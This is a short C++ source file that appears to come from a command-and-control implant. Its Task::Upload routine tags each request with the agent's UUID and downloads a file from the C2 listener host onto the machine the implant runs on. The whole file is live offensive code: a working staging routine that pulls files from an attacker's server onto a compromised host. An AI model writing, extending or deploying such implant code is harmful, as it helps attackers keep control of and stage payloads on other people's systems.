#include "core/task.hpp"

namespace Task
{
    std::wstring Upload(State::PState pState, const std::wstring& wSrc, const std::wstring& wDest)
    {
        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";

        // Download a specified file from the C2 server.
        BOOL bResult = System::Http::DownloadFile(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            wHeaders.c_str(),
            wSrc,
            wDest
        );
        if (!bResult)
        {
            return L"Error: Could not download a file.";
        }

        return wDest.c_str();
    }
}